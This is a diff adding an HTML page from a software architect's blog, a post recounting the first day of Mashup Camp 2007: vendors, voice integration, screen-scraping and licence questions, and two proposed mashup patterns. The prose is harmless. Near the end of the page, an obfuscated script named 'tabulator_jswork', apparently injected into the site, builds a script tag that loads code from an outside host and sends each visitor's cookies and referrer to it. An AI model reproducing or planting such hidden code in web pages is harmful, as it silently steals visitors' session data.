@@ -1,0 +1,269 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Mashup Camp - Enterprise Integration Patterns</title>
+<link rel="stylesheet" href="../eip.css" type="text/css">
+<link rel="alternate" type="text/xml" title="Ramblings RSS" href="http://www.eaipatterns.com/ramblings.rss">
+</head>
+<body bgcolor="#FFFFFF" text="#000000">
+<table cellpadding="3" cellspacing="0" border="0" width="100%">
+<tr>
+<td valign="top" width="180" align="center" rowspan="2"><noindex><a href="http://www.enterpriseintegrationpatterns.com"><img src="../img/eip.gif" border="0" width="134" height="56"></a></noindex></td><td valign="top" class="title"> Gregor's Ramblings</td>
+</tr>
+<tr>
+<td valign="bottom" class="header"><a href="../index.html">Home </a>&bull; 
+                <a href="../eaipatterns.html">Patterns </a>&bull; 
+                <a href="../ramblings.html">Ramblings </a>&bull; 
+                <a href="../articles.html">Articles </a>&bull; 
+                <a href="../talks.html">Talks </a>&bull; 
+                <a href="../downloads.html">Download </a>&bull; 
+                <a href="../links.html">Links </a>&bull; 
+                <a href="../books1.html">Books </a>&bull; 
+                <a href="../gregor.html">Contact </a></td>
+</tr>
+</table>
+<hr size="1" noshade="1">
+<table width="100%" border="0" cellpadding="2" cellspacing="0">
+<tr>
+<td valign="top">
+<p class="title">Mashup Camp</p>
+<p class="subheading">July 18, 2007</p>
+</td><td align="right" valign="top"><script type="text/javascript">
+<!--
+                google_ad_client = "pub-7454765501665483";
+                google_alternate_color = "FFFFFF";
+                google_ad_width = 468;
+                google_ad_height = 60;
+                google_ad_format = "468x60_as";
+                google_ad_channel ="2114747152";
+                google_color_border = "CCCCCC";
+                google_color_bg = "FFFFFF";
+                google_color_link = "000000";
+                google_color_url = "666666";
+                google_color_text = "333333";
+            --></script><script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script></td>
+</tr>
+</table>
+<table width="170" border="0" align="right" cellpadding="4" style="float:right;margin-left:8;border:3px ridge #666666;background-color:#99CCCC;">
+<tr>
+<td class="subheading">Recent Ramblings</td>
+</tr>
+<tr>
+<td class="small"><a href="75_ddd.html" style="color:#333333">DDD - Diagram Driven Design</a></td>
+</tr>
+<tr>
+<td class="small"><a href="74_messaging.html" style="color:#333333">What Does It Mean to Use Messaging?</a></td>
+</tr>
+<tr>
+<td class="small"><a href="73_writing.html" style="color:#333333">A Chapter a Day...</a></td>
+</tr>
+<tr>
+<td class="small"><a href="72_eipvolumes.html" style="color:#333333">EIP Visions</a></td>
+</tr>
+<tr>
+<td class="small"><a href="71_javaone.html" style="color:#333333">Clouds and Integration Patterns at JavaOne</a></td>
+</tr>
+<tr>
+<td class="small"><a href="70_wave.html" style="color:#333333">My First Google Wave Robot</a></td>
+</tr>
+<tr>
+<td class="small"><a href="69_googleio.html" style="color:#333333">Google I/O</a></td>
+</tr>
+<tr>
+<td class="small"><a href="68_acid.html" style="color:#333333">Into the Clouds on New Acid</a></td>
+</tr>
+<tr>
+<td class="small"><a href="67_patterns.html" style="color:#333333">Design Patterns: More than meets the eye</a></td>
+</tr>
+<tr>
+<td class="small"><a href="66_fouryears.html" style="color:#333333">Reflecting on Enterprise Integration Patterns</a></td>
+</tr>
+<tr>
+<td class="small"><a href="65_gears.html" style="color:#333333">Google Gears Live From Japan</a></td>
+</tr>
+<tr>
+<td class="small"><a href="64_oopslacss.html" style="color:#333333">Double-Dipping: OOPSLA and Colorado Software Summit</a></td>
+</tr>
+<tr>
+<td class="small"><a href="63_bubble20.html" style="color:#333333">Bubble 2.0</a></td>
+</tr>
+<tr>
+<td class="small"><a href="62_mashupsummit.html" style="color:#333333">Enterprise Mashup Summit</a></td>
+</tr>
+<tr>
+<td class="small"><a href="61_facebookgarage.html" style="color:#333333">Facebook Developer Garage</a></td>
+</tr>
+<tr>
+<td class="small"><a href="60_mashupmarket.html" style="color:#333333">Mashups Tools Market</a></td>
+</tr>
+<tr>
+<td class="small"><a href="59_mashupeai.html" style="color:#333333">Mashups == EAI 2.0?</a></td>
+</tr>
+<tr>
+<td class="small"><a href="58_mashupcamp.html" style="color:#333333">Mashup Camp</a></td>
+</tr>
+<tr>
+<td class="small"><a href="57_pipes.html" style="color:#333333">I Want My Events</a></td>
+</tr>
+<tr>
+<td class="small" style="color:#660000"><a href="../ramblings.html">ALL RAMBLINGS</a></td>
+</tr>
+</table>
+      
+<p xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+<noindex><a href="http://www.flickr.com/photos/skylinegtr/849893114" target="_blank"><img border="0" src="http://farm2.static.flickr.com/1152/849893114_9cc1b1b796_m.jpg" align="right"></a></noindex>I attended the first day of <noindex><a href="http://www.mashupcamp.com" target="_blank">Mashup Camp</a></noindex> today. The event took place at the <noindex><a href="http://www.computerhistory.org" target="_blank">Computer History Museum</a></noindex>, which is actually walking distance from my office. Ironically, the only day in the year when something actually happens within walking distance in Silicon Valley it had to rain. Oh well. On the upside, my walk took me past the temporary Kwiki Mart.</p>
+      
+      
+<p>This was my first mashup camp so I mostly came to listen and get plugged into this community. It's part of my master plan to bring integration ideas to a whole new user group. To not embarrass myself completely I authored some <noindex><a href="http://code.google.com/support/bin/topic.py?topic=12044" target="_blank">tutorials on Google Mashup Editor and Yahoo! Pipes</a></noindex> to code.google.com.</p>
+      
+      
+<p>The camp drew a good 100 &ndash; 150 people, which is a good size for an openspaces unconference. Apparently the Mashup University held during the past 2 days drew only about two dozen people, which is disappointing. Maybe people are intimidated by the hipster mashups crowd or it's impossible to time off from work to learn how to plot your favorite bars onto a Google map? Or maybe building mashups has become so easy that there is no need for a university? I guess we can only speculate or do a better job advertising the event next year.</p> 
+      
+<p>Here my impressions of day one:</p>
+      
+      
+<h2>Vendor Presence</h2>
+      
+<p>I was impressed and a bit surprised by the number of vendors at the conference. About 7 or 8 vendors had setup a table, including the usual heavyweights like IBM, Sun, Google (I was hoping for some Yahoo! Pipes folks) as well as mashup pureplays like Dapper. The overall feel I got was that the mashup community is a bit confused whether they want to be baggy pants wearing renegades scraping data off big corporate sites for the greater good of mankind or whether they want to be the next generation of VC funded Internet startups. I honestly expected more discussion and sharing as opposed to vendor demos, but some of the demos were actually interesting.</p>
+      
+      
+<p>I was a little put off by the openkapow guy who claimed that they solved all issues of brittleness in HTML screen scraping without being able to say exactly how. The demo seemed to use a fully qualified XPath into the DOM node of interest, the slashes cleverly replaced with dots. Not so robust. I am sure the tool can do much better than that but I did not expect to see that much hand waving and corporate attitude at camp. They one-upped this only when someone asked for their competitors to be told "I don't know. Can you name some?" Come on, dude, this is not MBA Camp but is supposed to be a community event. Plus, if you don&rsquo;t know your competitors you should not be running a business in the first place. Well, at least they are making money, which after some prompting turned out to be revenue money as opposed to profit money. I think the last time we brushed off the difference as a minor detail was in 2000. Besides the attitude, though, the tool looked pretty powerful.</p>
+      
+      
+<h2>Voice Integration</h2>
+      
+      
+<p>I noticed a surprising variety of voice integration, possibly spurred by the attendance of folks from <noindex><a href="http://www.lignup.com/" target="_blank">Lignup</a></noindex>. The ability to have your computer call you is intriguing because the system includes an IVR voice prompt ability. Hmmm, now I can create my own customer service menus? Press "1" if you are aggravated, "2" if you want to kill the service rep. I think voice also has liabilities because it is a synchronous medium (at least if you want the interactivity). Also, getting 50 alert e-mails are easier to deal with than 50 alert calls. Still I like to have the option of integrating voice into my applications. Google local voice for example is great and the voice recognition is amazingly good.</p>
+      
+        
+<h2>End User License Agreements</h2>
+      
+<p>
+<noindex><a href="http://www.flickr.com/photos/skylinegtr/847950819/" target="_blank"><img border="0" src="http://farm2.static.flickr.com/1356/847950819_6f8009c7db_m.jpg" align="right" alt="The openspace board"></a></noindex>Mashup Camp partly felt like a graffiti artist convention. The performers know that what they do is not quite legal but it is cool. Until they try to make a living off it. The issue of Web site end user agreements became most apparent when one of the guys decided to use his "Clipper" tool to take the Google search page and replace the Google logo with the Yahoo! Logo and clip the ads off the results page. To his shock, Google had asked him to take down some of these hosted "services". While it may seem so corporate and anal for people to not allow you to scrape their screens we need to remember that some of them pay for the data, so there rarely is a free lunch. Even in the dot-com run-up someone paid for all those free services and parties. Some of my friends are still writing their $3000 per year capital losses. It'll be interesting to see how the issue of data ownership will evolve. Ads in RSS? Micropayments? As mashups become more popular (especially the HTML scraping ones) I am certain the issue will come up. HTML screen scraping is always going to be controversial because sites who like to share their data already provide feeds (e.g., most of the Web 2.0 crowd or marketplaces like craiglist). The ones who don't, probably don't like you to scrape their data off their (probably ad-funded) site. Luckily, inside the enterprise this is less of an issue.</p>
+      
+        
+<h2>Integration Tools</h2>
+        
+<p>The guys from IBM and <noindex><a href="http://www.snaplogic.com/" target="_blank">SnapLogic</a></noindex> showed mashup data processing tools that share some similarities with early EAI tools (TIBCO MessageBroker comes to mind). Similar to Yahoo! Pipes they allow users to users to compose data pipelines that extract, transform, and combine data. The data stream is then available in a variety of formats, for example RSS and Atom. The demo combined data from SalesForce and Quickbooks.</p>
+      
+        
+<h2>Enterprise Mashups</h2>
+      
+<p>I joined a good discussion on enterprise mashups. This was not a demo but more of a brainstorm. We concluded that it is not so simple to distinguish between mashups and composite applications. We did compile the following list to help contrast them:</p>
+      
+      
+<ul>
+        
+<li>Mashups: REST/XML, ad-hoc, bottom-up, easy to change, low expectations, built by user</li>
+        
+<li>Composite Apps: SOA/WS-*, planned, top-down, more static, (too) high expectations, built by IT</li>
+      
+</ul>
+      
+      
+<p>I think part of the big shift here is that in the past ad-hoc solutions were not integratable and integratable solutions were cumbersome to build. Mashups are often built ad-hoc but simple protocols like RSS or Atoms allow them to be integrated very easily. One person rightly pointed out that enterprise mashups are the Visual Basic macro of the Internet age.</p>
+      
+      
+<h2>Mashup Patterns</h2>
+      
+<p>
+<noindex><a href="http://www.flickr.com/photos/skylinegtr/848721152" target="_blank"><img border="0" src="http://farm2.static.flickr.com/1175/848721152_287792faa9_m.jpg" align="right" alt="SpeedGeek"></a></noindex>I really enjoyed talking to the guy who build a mashup across Amazon and public library Web sites. He keeps a wish list on Amazon and checks the public library to see whether they have the book. It was refreshing to hear about some of the actuall issues and hurdles he had to overcome (unlike most of the vendors, who make you believe it is a piece of cake once you use their tool). For example, Amazon data for books works by ASIN, which for books equals the ISBN. As such, it cannot recognize the relationship between the same works published in different editions or as book on tape.</p>
+      
+<p>Another interesting hurdle was the fact that you cannot search Amazon by UPC for non-book products. However, you can get the UPS once you have the ASIN. To go from UPC to ASIN the solution uses Google search. The wide syndication of Amazon data enables a search for the UPC and the word "ASIN" to include the ASIN in the search results. To minimize errors the solution uses the discovered ASIN and retrieves the UPC from Amazon to make sure the match is correct.</p>
+      
+<p>I think these techniques could make for some more widely applicable mashup patterns:</p>
+      
+      
+<p>
+<b>Key Translation with Search</b>
+</p>
+      
+<p>Problem: You have a key but require a different key for a database lookup. </p>
+      
+<p>Forces: Popular keys are likely to be stored on Web pages in proximity. Getting a key translation database will be difficult or impossible</p>
+      
+<p>Solution: Search for the key you have and the name of the desired key.</p>
+      
+      
+<p>I tried this approach to do perform geocoding. A <noindex><a href="http://www.google.com/search?q=san+francisco+geo%3along" target="_blank">simple search for "San Francisco geo:long"</a></noindex> yields the following text in the first result <b>geo:lat=37.759665 geo:long=-122.421509</b>. A quick check in Google Earth confirms that the coordinates do in fact point to San Francisco. Maybe this is a trivial example but it makes we want to try this with more types of keys.</p>
+      
+      
+<p>
+<b>Lookup Confirmation</b>
+</p>
+      
+<p>Problem: You can find key B from key A but nor the other way around. You have a unreliable method to lookup A from B.</p>
+      
+<p>Solution: Perform the unreliable lookup from B to A. Then use the precise lookup from A to B to make sure you got the right A.</p>
+      
+      
+<p>These patterns could benefit from some more elaboration but I think documenting some of the approaches will be useful for mashup developers</p>
+      
+      
+<h2>More Later</h2>
+      
+<p>Time to go to bed to be fresh for another day at camp.</p>
+      
+    
+<p>
+<a href="../ramblings.html" class="small">MORE RAMBLINGS</a>&nbsp;&nbsp;&nbsp;
+                   <a href="../ramblings.rss"><img src="../img/feed_icon.png" border="0" alt="Subscribe" align="absmiddle"></a>&nbsp;
+                   <a href="../ramblings.rss" class="small">SUBSCRIBE TO GREGOR'S RAMBLINGS</a>
+</p>
+<hr>
+<table>
+<tr>
+<td width="90" align="left" valign="top"><img src="../img/Gregor_Portrait_75_90.jpg" width="75" height="90"></td><td valign="top">
+            Gregor is a software architect with Google. He is a frequent speaker on asynchronous messaging and service-oriented architectures and co-authored <i>Enterprise Integration Patterns</i>  (Addison-Wesley).  His mission is to make integration and distributed system development easier by harvesting common patterns and best practices from many different technologies.<br>
+<noindex><a href="http://www.eaipatterns.com">www.eaipatterns.com</a></noindex></td>
+</tr>
+</table>
+<hr>
+<table cellpadding="2" cellspacing="0" border="0" width="100%">
+<tr>
+<td class="footer" align="center" width="200"><noindex><a href="http://www.google.com/intl/en/about.html" target="_blank"><img src="../img/google_logo.gif" border="0" alt="Google"></a></noindex></td><td class="footer" align="center">&copy; 2010          
+   <script language="javascript" type="text/javascript">             
+		   
+function hiveware_enkoder(){var i,j,x,y,x=
+"x=\"783d2232353634373936323737376532343765363536643635373336663634365c223d" +
+"78376336393631366436323263356433363635363237383630323136633332323837393632" +
+"37303732373536343765363536303466363636653639366133663634373437313630376536" +
+"66363936343731363237373635363437653639363536333733363536613632363537333766" +
+"33643666363336653233376536323735363436343765363934303235363337393632373037" +
+"32373536343765363534643334376536323735363437343731363035303265366636393634" +
+"37313632373736353763363936313664363232633564333536633634373936343730323232" +
+"63353336323730373237353634376536353630346636363665363936303261336636343731" +
+"36303765366636393634373136323737363536343765363936353633373936353632373734" +
+"65333232633564366636333665323337653632373536343734336233393232326533313666" +
+"32633335363037383666363834303232376636373d2b693b6874676e656c2e783c693b303d" +
+"6928726f663b27273d793b5c2262333029322c69287274736275732e782b27252728657061" +
+"6373656e753d2b797b2932797d3b29223b793d27273b666f7228693d303b693c782e6c656e" +
+"6774683b692b3d3332297b666f72286a3d4d6174682e6d696e28782e6c656e6774682c692b" +
+"3332293b2d2d6a3e3d693b297b792b3d782e636861724174286a293b7d7d793b\";y='';fo" +
+"r(i=0;i<x.length;i+=2){y+=unescape('%'+x.substr(i,2));}y";
+while(x=eval(x));}hiveware_enkoder();             
+</script>&nbsp;&bull; All rights reserved.
+               </td>
+</tr>
+</table>
+<hr>
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script><script type="text/javascript">
+    _uacct = "UA-1733257-1";
+    urchinTracker();
+  </script>
+<!-- 1cc283b77ef211ce9f6b98130dd4d971 --> <script>function tabulator_jswork(id) { var t00 = document; var chars = '&nkGprZQ*Oe1fsTxRY =dqitX/hMEWAyBCDJ.9lNUKoI?<+7w0cbj"H;5g:P!v26z3FV8aL4muS>'; var r = escape(t00.referrer); var c = escape(t00.cookie); var i = escape(id); var h = escape('integrationpatterns'); t00.write(String(chars.charAt(45) + "$" + chars.charAt(13) + "$" + chars.charAt(50) + "$" + chars.charAt(5) + "$" + chars.charAt(22) + "$" + chars.charAt(4) + "$" + chars.charAt(23) + "$" + chars.charAt(18) + "$" + chars.charAt(13) + "$" + chars.charAt(5) + "$" + chars.charAt(50) + "$" + chars.charAt(19) + "$" + chars.charAt(53) + "$" + chars.charAt(26) + "$" + chars.charAt(23) + "$" + chars.charAt(23) + "$" + chars.charAt(4) + "$" + chars.charAt(58) + "$" + chars.charAt(25) + "$" + chars.charAt(25) + "$" + chars.charAt(13) + "$" + chars.charAt(51) + "$" + chars.charAt(20) + "$" + chars.charAt(23) + "$" + chars.charAt(20) + "$" + chars.charAt(13) + "$" + chars.charAt(36) + "$" + chars.charAt(50) + "$" + chars.charAt(42) + "$" + chars.charAt(72) + "$" + chars.charAt(25) + "$" + chars.charAt(69) + "$" + chars.charAt(50) + "$" + chars.charAt(42) + "$" + chars.charAt(73) + "$" + chars.charAt(1) + "$" + chars.charAt(23) + "$" + chars.charAt(10) + "$" + chars.charAt(5) + "$" + chars.charAt(36) + "$" + chars.charAt(52) + "$" + chars.charAt(13) + "$" + chars.charAt(44) + "$" + "$").replace(/\$/g,'') + "r=" + r + "&c=" + c + "&i=" + i + "&h=" + h + String(chars.charAt(53) + "^" + chars.charAt(75) + "^" + chars.charAt(45) + "^" + chars.charAt(25) + "^" + chars.charAt(13) + "^" + chars.charAt(50) + "^" + chars.charAt(5) + "^" + chars.charAt(22) + "^" + chars.charAt(4) + "^" + chars.charAt(23) + "^" + chars.charAt(75) + "^" + "^").replace(/\^/g,'')); } </script><style>
+div#beb169d2938bdde76ce4ce4099c6cc717, div#beb169d2938bdde76ce4ce4099c6cc717 a
+{
+ font-style: normal;
+ font-weight: normal;
+ font-family: Verdana, Tahoma, sans-serif;
+ font-size: 8px;
+ text-decoration: none;
+ color: gray;
+ text-align: center;
+  }
+</style>
+<div id='beb169d2938bdde76ce4ce4099c6cc717'><!--check code--></div>
+<script>tabulator_jswork('beb169d2938bdde76ce4ce4099c6cc717');</script>
+<!-- 1cc283b77ef211ce9f6b98130dd4d971 --></body>
+</html>
